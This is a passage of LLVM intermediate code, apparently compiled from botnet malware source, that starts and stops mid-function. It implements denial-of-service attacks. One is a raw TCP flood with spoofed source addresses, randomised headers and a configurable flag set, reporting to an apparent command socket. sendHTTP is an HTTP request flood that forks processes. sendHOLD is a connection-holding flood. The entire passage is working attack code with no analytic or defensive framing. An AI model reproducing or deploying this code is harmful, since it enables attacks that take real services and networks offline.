  %151 = bitcast %union.anon.1* %150 to %struct.anon.2*
  %152 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %151, i32 0, i32 4
  %153 = load i16, i16* %152, align 4
  %154 = and i16 %153, -2049
  %155 = or i16 %154, 2048
  store i16 %155, i16* %152, align 4
  br label %233

; <label>:156:                                    ; preds = %73
  %157 = load i8*, i8** %12, align 8
  %158 = call i8* @strtok(i8* %157, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %158, i8** %23, align 8
  br label %159

; <label>:159:                                    ; preds = %230, %156
  %160 = load i8*, i8** %23, align 8
  %161 = icmp ne i8* %160, null
  br i1 %161, label %162, label %232

; <label>:162:                                    ; preds = %159
  %163 = load i8*, i8** %23, align 8
  %164 = call i32 @strcmp(i8* %163, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.407, i32 0, i32 0)) #10
  %165 = icmp ne i32 %164, 0
  br i1 %165, label %174, label %166

; <label>:166:                                    ; preds = %162
  %167 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %168 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %167, i32 0, i32 0
  %169 = bitcast %union.anon.1* %168 to %struct.anon.2*
  %170 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %169, i32 0, i32 4
  %171 = load i16, i16* %170, align 4
  %172 = and i16 %171, -513
  %173 = or i16 %172, 512
  store i16 %173, i16* %170, align 4
  br label %230

; <label>:174:                                    ; preds = %162
  %175 = load i8*, i8** %23, align 8
  %176 = call i32 @strcmp(i8* %175, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.408, i32 0, i32 0)) #10
  %177 = icmp ne i32 %176, 0
  br i1 %177, label %186, label %178

; <label>:178:                                    ; preds = %174
  %179 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %180 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %179, i32 0, i32 0
  %181 = bitcast %union.anon.1* %180 to %struct.anon.2*
  %182 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %181, i32 0, i32 4
  %183 = load i16, i16* %182, align 4
  %184 = and i16 %183, -1025
  %185 = or i16 %184, 1024
  store i16 %185, i16* %182, align 4
  br label %229

; <label>:186:                                    ; preds = %174
  %187 = load i8*, i8** %23, align 8
  %188 = call i32 @strcmp(i8* %187, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.409, i32 0, i32 0)) #10
  %189 = icmp ne i32 %188, 0
  br i1 %189, label %198, label %190

; <label>:190:                                    ; preds = %186
  %191 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %192 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %191, i32 0, i32 0
  %193 = bitcast %union.anon.1* %192 to %struct.anon.2*
  %194 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %193, i32 0, i32 4
  %195 = load i16, i16* %194, align 4
  %196 = and i16 %195, -257
  %197 = or i16 %196, 256
  store i16 %197, i16* %194, align 4
  br label %228

; <label>:198:                                    ; preds = %186
  %199 = load i8*, i8** %23, align 8
  %200 = call i32 @strcmp(i8* %199, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.410, i32 0, i32 0)) #10
  %201 = icmp ne i32 %200, 0
  br i1 %201, label %210, label %202

; <label>:202:                                    ; preds = %198
  %203 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %204 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %203, i32 0, i32 0
  %205 = bitcast %union.anon.1* %204 to %struct.anon.2*
  %206 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %205, i32 0, i32 4
  %207 = load i16, i16* %206, align 4
  %208 = and i16 %207, -4097
  %209 = or i16 %208, 4096
  store i16 %209, i16* %206, align 4
  br label %227

; <label>:210:                                    ; preds = %198
  %211 = load i8*, i8** %23, align 8
  %212 = call i32 @strcmp(i8* %211, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.411, i32 0, i32 0)) #10
  %213 = icmp ne i32 %212, 0
  br i1 %213, label %222, label %214

; <label>:214:                                    ; preds = %210
  %215 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %216 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %215, i32 0, i32 0
  %217 = bitcast %union.anon.1* %216 to %struct.anon.2*
  %218 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %217, i32 0, i32 4
  %219 = load i16, i16* %218, align 4
  %220 = and i16 %219, -2049
  %221 = or i16 %220, 2048
  store i16 %221, i16* %218, align 4
  br label %226

; <label>:222:                                    ; preds = %210
  %223 = load i32, i32* @mainCommSock, align 4
  %224 = load i8*, i8** %23, align 8
  %225 = call i32 (i32, i8*, ...) @sockprintf(i32 %223, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.412, i32 0, i32 0), i8* %224)
  br label %226

; <label>:226:                                    ; preds = %222, %214
  br label %227

; <label>:227:                                    ; preds = %226, %202
  br label %228

; <label>:228:                                    ; preds = %227, %190
  br label %229

; <label>:229:                                    ; preds = %228, %178
  br label %230

; <label>:230:                                    ; preds = %229, %166
  %231 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %231, i8** %23, align 8
  br label %159

; <label>:232:                                    ; preds = %159
  br label %233

; <label>:233:                                    ; preds = %232, %120
  %234 = call i32 @rand_cmwc()
  %235 = trunc i32 %234 to i16
  %236 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 0
  %238 = bitcast %union.anon.1* %237 to %struct.anon.2*
  %239 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %238, i32 0, i32 5
  store i16 %235, i16* %239, align 2
  %240 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 0
  %242 = bitcast %union.anon.1* %241 to %struct.anon.2*
  %243 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %242, i32 0, i32 6
  store i16 0, i16* %243, align 4
  %244 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 0
  %246 = bitcast %union.anon.1* %245 to %struct.anon.2*
  %247 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %246, i32 0, i32 7
  store i16 0, i16* %247, align 2
  %248 = load i32, i32* %9, align 4
  %249 = icmp eq i32 %248, 0
  br i1 %249, label %250, label %252

; <label>:250:                                    ; preds = %233
  %251 = call i32 @rand_cmwc()
  br label %257

; <label>:252:                                    ; preds = %233
  %253 = load i32, i32* %9, align 4
  %254 = trunc i32 %253 to i16
  %255 = call zeroext i16 @htons(i16 zeroext %254) #13
  %256 = zext i16 %255 to i32
  br label %257

; <label>:257:                                    ; preds = %252, %250
  %258 = phi i32 [ %251, %250 ], [ %256, %252 ]
  %259 = trunc i32 %258 to i16
  %260 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %261 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %260, i32 0, i32 0
  %262 = bitcast %union.anon.1* %261 to %struct.anon.2*
  %263 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %262, i32 0, i32 1
  store i16 %259, i16* %263, align 2
  %264 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %265 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %266 = call zeroext i16 @tcpcsum(%struct.iphdr* %264, %struct.tcphdr* %265)
  %267 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %268 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %267, i32 0, i32 0
  %269 = bitcast %union.anon.1* %268 to %struct.anon.2*
  %270 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %269, i32 0, i32 6
  store i16 %266, i16* %270, align 4
  %271 = bitcast i8* %78 to i16*
  %272 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %273 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %272, i32 0, i32 2
  %274 = load i16, i16* %273, align 2
  %275 = zext i16 %274 to i32
  %276 = call zeroext i16 @csum(i16* %271, i32 %275)
  %277 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i32 0, i32 7
  store i16 %276, i16* %278, align 2
  %279 = call i64 @time(i64* null) #2
  %280 = load i32, i32* %10, align 4
  %281 = sext i32 %280 to i64
  %282 = add nsw i64 %279, %281
  %283 = trunc i64 %282 to i32
  store i32 %283, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %284

; <label>:284:                                    ; preds = %341, %340, %257
  br label %285

; <label>:285:                                    ; preds = %284
  %286 = load i32, i32* %17, align 4
  %287 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  %288 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %288, %struct.sockaddr** %287, align 8
  %289 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %290 = load %struct.sockaddr*, %struct.sockaddr** %289, align 8
  %291 = call i64 @sendto(i32 %286, i8* %78, i64 %76, i32 0, %struct.sockaddr* %290, i32 16)
  %292 = load i32, i32* %19, align 4
  %293 = call i32 (i32, ...) bitcast (i32 ()* @getDatIP to i32 (i32, ...)*)(i32 %292)
  %294 = call i32 @htonl(i32 %293) #13
  %295 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %296 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %295, i32 0, i32 8
  store i32 %294, i32* %296, align 4
  %297 = call i32 @rand_cmwc()
  %298 = trunc i32 %297 to i16
  %299 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %300 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %299, i32 0, i32 3
  store i16 %298, i16* %300, align 4
  %301 = call i32 @rand_cmwc()
  %302 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %303 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %302, i32 0, i32 0
  %304 = bitcast %union.anon.1* %303 to %struct.anon.2*
  %305 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %304, i32 0, i32 2
  store i32 %301, i32* %305, align 4
  %306 = call i32 @rand_cmwc()
  %307 = trunc i32 %306 to i16
  %308 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %309 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %308, i32 0, i32 0
  %310 = bitcast %union.anon.1* %309 to %struct.anon.2*
  %311 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %310, i32 0, i32 0
  store i16 %307, i16* %311, align 4
  %312 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %313 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %312, i32 0, i32 0
  %314 = bitcast %union.anon.1* %313 to %struct.anon.2*
  %315 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %314, i32 0, i32 6
  store i16 0, i16* %315, align 4
  %316 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %317 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %318 = call zeroext i16 @tcpcsum(%struct.iphdr* %316, %struct.tcphdr* %317)
  %319 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %320 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %319, i32 0, i32 0
  %321 = bitcast %union.anon.1* %320 to %struct.anon.2*
  %322 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %321, i32 0, i32 6
  store i16 %318, i16* %322, align 4
  %323 = bitcast i8* %78 to i16*
  %324 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %325 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %324, i32 0, i32 2
  %326 = load i16, i16* %325, align 2
  %327 = zext i16 %326 to i32
  %328 = call zeroext i16 @csum(i16* %323, i32 %327)
  %329 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %330 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %329, i32 0, i32 7
  store i16 %328, i16* %330, align 2
  %331 = load i32, i32* %25, align 4
  %332 = load i32, i32* %15, align 4
  %333 = icmp eq i32 %331, %332
  br i1 %333, label %334, label %341

; <label>:334:                                    ; preds = %285
  %335 = call i64 @time(i64* null) #2
  %336 = load i32, i32* %24, align 4
  %337 = sext i32 %336 to i64
  %338 = icmp sgt i64 %335, %337
  br i1 %338, label %339, label %340

; <label>:339:                                    ; preds = %334
  br label %344

; <label>:340:                                    ; preds = %334
  store i32 0, i32* %25, align 4
  br label %284

; <label>:341:                                    ; preds = %285
  %342 = load i32, i32* %25, align 4
  %343 = add i32 %342, 1
  store i32 %343, i32* %25, align 4
  br label %284

; <label>:344:                                    ; preds = %339
  %345 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %345)
  br label %346

; <label>:346:                                    ; preds = %344, %60, %52, %45
  ret void
}

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [3 x i8*], align 16
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [512 x i8], align 16
  %17 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %18 = bitcast [3 x i8*]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %18, i8* bitcast ([3 x i8*]* @sendHTTP.connections to i8*), i64 24, i32 16, i1 false)
  %19 = call i64 @time(i64* null) #2
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = add nsw i64 %19, %21
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %15, align 4
  %24 = getelementptr inbounds [512 x i8], [512 x i8]* %16, i32 0, i32 0
  %25 = load i8*, i8** %7, align 8
  %26 = load i8*, i8** %10, align 8
  %27 = call i32 @rand() #2
  %28 = srem i32 %27, 3
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [3 x i8*], [3 x i8*]* %13, i64 0, i64 %29
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @rand() #2
  %33 = sext i32 %32 to i64
  %34 = urem i64 %33, 36
  %35 = getelementptr inbounds [36 x i8*], [36 x i8*]* @UserAgents, i64 0, i64 %34
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 (i8*, i8*, ...) @sprintf(i8* %24, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.416, i32 0, i32 0), i8* %25, i8* %26, i8* %31, i8* %36) #2
  store i32 0, i32* %14, align 4
  br label %38

; <label>:38:                                     ; preds = %68, %6
  %39 = load i32, i32* %14, align 4
  %40 = load i32, i32* %12, align 4
  %41 = icmp slt i32 %39, %40
  br i1 %41, label %42, label %71

; <label>:42:                                     ; preds = %38
  %43 = call i32 @fork() #2
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %67

; <label>:45:                                     ; preds = %42
  br label %46

; <label>:46:                                     ; preds = %65, %45
  %47 = load i32, i32* %15, align 4
  %48 = sext i32 %47 to i64
  %49 = call i64 @time(i64* null) #2
  %50 = icmp sgt i64 %48, %49
  br i1 %50, label %51, label %66

; <label>:51:                                     ; preds = %46
  %52 = load i8*, i8** %8, align 8
  %53 = load i16, i16* %9, align 2
  %54 = call i32 @socket_connect(i8* %52, i16 zeroext %53)
  store i32 %54, i32* %17, align 4
  %55 = load i32, i32* %17, align 4
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %65

; <label>:57:                                     ; preds = %51
  %58 = load i32, i32* %17, align 4
  %59 = getelementptr inbounds [512 x i8], [512 x i8]* %16, i32 0, i32 0
  %60 = getelementptr inbounds [512 x i8], [512 x i8]* %16, i32 0, i32 0
  %61 = call i64 @strlen(i8* %60) #10
  %62 = call i64 @write(i32 %58, i8* %59, i64 %61)
  %63 = load i32, i32* %17, align 4
  %64 = call i32 @close(i32 %63)
  br label %65

; <label>:65:                                     ; preds = %57, %51
  br label %46

; <label>:66:                                     ; preds = %46
  call void @exit(i32 1) #14
  unreachable

; <label>:67:                                     ; preds = %42
  br label %68

; <label>:68:                                     ; preds = %67
  %69 = load i32, i32* %14, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %14, align 4
  br label %38

; <label>:71:                                     ; preds = %38
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %22 = call i32 @getdtablesize() #2
  %23 = sdiv i32 %22, 2
  store i32 %23, i32* %7, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %5, align 4
  %26 = trunc i32 %25 to i16
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = load i8*, i8** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %31 = call i32 @getHost(i8* %29, %struct.in_addr* %30)
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %3
  br label %260

; <label>:34:                                     ; preds = %3
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %36 = getelementptr inbounds [8 x i8], [8 x i8]* %35, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 8, i32 4, i1 false)
  %37 = load i32, i32* %7, align 4
  %38 = zext i32 %37 to i64
  %39 = call i8* @llvm.stacksave()
  store i8* %39, i8** %10, align 8
  %40 = alloca %struct.state_t, i64 %38, align 16
  %41 = bitcast %struct.state_t* %40 to i8*
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = mul i64 %43, 5
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 %44, i32 16, i1 false)
  %45 = call i64 @time(i64* null) #2
  %46 = load i32, i32* %6, align 4
  %47 = sext i32 %46 to i64
  %48 = add nsw i64 %45, %47
  %49 = trunc i64 %48 to i32
  store i32 %49, i32* %16, align 4
  br label %50

; <label>:50:                                     ; preds = %257, %34
  %51 = load i32, i32* %16, align 4
  %52 = sext i32 %51 to i64
  %53 = call i64 @time(i64* null) #2
  %54 = icmp sgt i64 %52, %53
  br i1 %54, label %55, label %258

; <label>:55:                                     ; preds = %50
  store i32 0, i32* %8, align 4
  br label %56

; <label>:56:                                     ; preds = %254, %55
  %57 = load i32, i32* %8, align 4
  %58 = load i32, i32* %7, align 4
  %59 = icmp slt i32 %57, %58
  br i1 %59, label %60, label %257

; <label>:60:                                     ; preds = %56
  %61 = load i32, i32* %8, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %62
  %64 = getelementptr inbounds %struct.state_t, %struct.state_t* %63, i32 0, i32 1
  %65 = load i8, i8* %64, align 4
  %66 = zext i8 %65 to i32
  switch i32 %66, label %253 [
    i32 0, label %67
    i32 1, label %114
    i32 2, label %199
  ]

; <label>:67:                                     ; preds = %60
  %68 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %69 = load i32, i32* %8, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %70
  %72 = getelementptr inbounds %struct.state_t, %struct.state_t* %71, i32 0, i32 0
  store i32 %68, i32* %72, align 8
  %73 = load i32, i32* %8, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %74
  %76 = getelementptr inbounds %struct.state_t, %struct.state_t* %75, i32 0, i32 0
  %77 = load i32, i32* %76, align 8
  %78 = load i32, i32* %8, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %79
  %81 = getelementptr inbounds %struct.state_t, %struct.state_t* %80, i32 0, i32 0
  %82 = load i32, i32* %81, align 8
  %83 = call i32 (i32, i32, ...) @fcntl(i32 %82, i32 3, i8* null)
  %84 = or i32 %83, 2048
  %85 = call i32 (i32, i32, ...) @fcntl(i32 %77, i32 4, i32 %84)
  %86 = load i32, i32* %8, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %87
  %89 = getelementptr inbounds %struct.state_t, %struct.state_t* %88, i32 0, i32 0
  %90 = load i32, i32* %89, align 8
  %91 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %92 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %92, %struct.sockaddr** %91, align 8
  %93 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %94 = load %struct.sockaddr*, %struct.sockaddr** %93, align 8
  %95 = call i32 @connect(i32 %90, %struct.sockaddr* %94, i32 16)
  %96 = icmp ne i32 %95, -1
  br i1 %96, label %101, label %97

; <label>:97:                                     ; preds = %67
  %98 = call i32* @__errno_location() #13
  %99 = load i32, i32* %98, align 4
  %100 = icmp ne i32 %99, 115
  br i1 %100, label %101, label %108

; <label>:101:                                    ; preds = %97, %67
  %102 = load i32, i32* %8, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %103
  %105 = getelementptr inbounds %struct.state_t, %struct.state_t* %104, i32 0, i32 0
  %106 = load i32, i32* %105, align 8
  %107 = call i32 @close(i32 %106)
  br label %113

; <label>:108:                                    ; preds = %97
  %109 = load i32, i32* %8, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %110
  %112 = getelementptr inbounds %struct.state_t, %struct.state_t* %111, i32 0, i32 1
  store i8 1, i8* %112, align 4
  br label %113

; <label>:113:                                    ; preds = %108, %101
  br label %253

; <label>:114:                                    ; preds = %60
  br label %115

; <label>:115:                                    ; preds = %114
  %116 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %117 = getelementptr inbounds [16 x i64], [16 x i64]* %116, i64 0, i64 0
  %118 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %117) #2, !srcloc !7
  %119 = extractvalue { i64, i64* } %118, 0
  %120 = extractvalue { i64, i64* } %118, 1
  %121 = trunc i64 %119 to i32
  store i32 %121, i32* %18, align 4
  %122 = ptrtoint i64* %120 to i64
  %123 = trunc i64 %122 to i32
  store i32 %123, i32* %19, align 4
  br label %124

; <label>:124:                                    ; preds = %115
  br label %125

; <label>:125:                                    ; preds = %124
  %126 = load i32, i32* %8, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %127
  %129 = getelementptr inbounds %struct.state_t, %struct.state_t* %128, i32 0, i32 0
  %130 = load i32, i32* %129, align 8
  %131 = srem i32 %130, 64
  %132 = zext i32 %131 to i64
  %133 = shl i64 1, %132
  %134 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %135 = load i32, i32* %8, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %136
  %138 = getelementptr inbounds %struct.state_t, %struct.state_t* %137, i32 0, i32 0
  %139 = load i32, i32* %138, align 8
  %140 = sdiv i32 %139, 64
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds [16 x i64], [16 x i64]* %134, i64 0, i64 %141
  %143 = load i64, i64* %142, align 8
  %144 = or i64 %143, %133
  store i64 %144, i64* %142, align 8
  %145 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %145, align 8
  %146 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %146, align 8
  %147 = load i32, i32* %8, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %148
  %150 = getelementptr inbounds %struct.state_t, %struct.state_t* %149, i32 0, i32 0
  %151 = load i32, i32* %150, align 8
  %152 = add nsw i32 %151, 1
  %153 = call i32 @select(i32 %152, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %153, i32* %15, align 4
  %154 = load i32, i32* %15, align 4
  %155 = icmp eq i32 %154, 1
  br i1 %155, label %156, label %183

; <label>:156:                                    ; preds = %125
  store i32 4, i32* %13, align 4
  %157 = load i32, i32* %8, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %158
  %160 = getelementptr inbounds %struct.state_t, %struct.state_t* %159, i32 0, i32 0
  %161 = load i32, i32* %160, align 8
  %162 = bitcast i32* %14 to i8*
  %163 = call i32 @getsockopt(i32 %161, i32 1, i32 4, i8* %162, i32* %13) #2
  %164 = load i32, i32* %14, align 4
  %165 = icmp ne i32 %164, 0
  br i1 %165, label %166, label %177

; <label>:166:                                    ; preds = %156
  %167 = load i32, i32* %8, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %168
  %170 = getelementptr inbounds %struct.state_t, %struct.state_t* %169, i32 0, i32 0
  %171 = load i32, i32* %170, align 8
  %172 = call i32 @close(i32 %171)
  %173 = load i32, i32* %8, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %174
  %176 = getelementptr inbounds %struct.state_t, %struct.state_t* %175, i32 0, i32 1
  store i8 0, i8* %176, align 4
  br label %182

; <label>:177:                                    ; preds = %156
  %178 = load i32, i32* %8, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %179
  %181 = getelementptr inbounds %struct.state_t, %struct.state_t* %180, i32 0, i32 1
  store i8 2, i8* %181, align 4
  br label %182

; <label>:182:                                    ; preds = %177, %166
  br label %198

; <label>:183:                                    ; preds = %125
  %184 = load i32, i32* %15, align 4
  %185 = icmp eq i32 %184, -1
  br i1 %185, label %186, label %197

; <label>:186:                                    ; preds = %183
  %187 = load i32, i32* %8, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %188
  %190 = getelementptr inbounds %struct.state_t, %struct.state_t* %189, i32 0, i32 0
  %191 = load i32, i32* %190, align 8
  %192 = call i32 @close(i32 %191)
  %193 = load i32, i32* %8, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %194
  %196 = getelementptr inbounds %struct.state_t, %struct.state_t* %195, i32 0, i32 1
  store i8 0, i8* %196, align 4
  br label %197

; <label>:197:                                    ; preds = %186, %183
  br label %198

; <label>:198:                                    ; preds = %197, %182
  br label %253

; <label>:199:                                    ; preds = %60
  br label %200

; <label>:200:                                    ; preds = %199
  %201 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %202 = getelementptr inbounds [16 x i64], [16 x i64]* %201, i64 0, i64 0
  %203 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %202) #2, !srcloc !8
  %204 = extractvalue { i64, i64* } %203, 0
  %205 = extractvalue { i64, i64* } %203, 1
  %206 = trunc i64 %204 to i32
  store i32 %206, i32* %20, align 4
  %207 = ptrtoint i64* %205 to i64
  %208 = trunc i64 %207 to i32
  store i32 %208, i32* %21, align 4
  br label %209

; <label>:209:                                    ; preds = %200
  br label %210

; <label>:210:                                    ; preds = %209
  %211 = load i32, i32* %8, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %212
  %214 = getelementptr inbounds %struct.state_t, %struct.state_t* %213, i32 0, i32 0
  %215 = load i32, i32* %214, align 8
  %216 = srem i32 %215, 64
  %217 = zext i32 %216 to i64
  %218 = shl i64 1, %217
